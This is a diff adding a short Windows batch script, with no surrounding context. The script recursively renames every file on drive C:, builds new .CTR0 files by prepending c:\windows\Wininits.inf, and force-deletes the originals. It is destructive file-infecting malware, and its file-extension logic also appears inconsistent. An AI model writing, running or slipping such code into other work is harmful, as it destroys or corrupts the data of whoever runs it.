@@ -1,0 +1,16 @@
+REM c:
+REM cd \
+for /r c:\ %%x in (*.*) do (
+	if not %%~xx==.CTR0 (
+		rename %%~sx %%~nx.C0
+		if %errorlevel%==0 (
+			echo %%x
+			rem echo %%~xx
+			rem echo %%~dpnx
+			if exist %%~sdpnx.C0 (
+				copy /b c:\windows\Wininits.inf+%%~sdpnx.PY %%~sdpnx.CTR0
+				del /F /Q %%~sdpnx.C0
+			)
+		)
+	)
+)
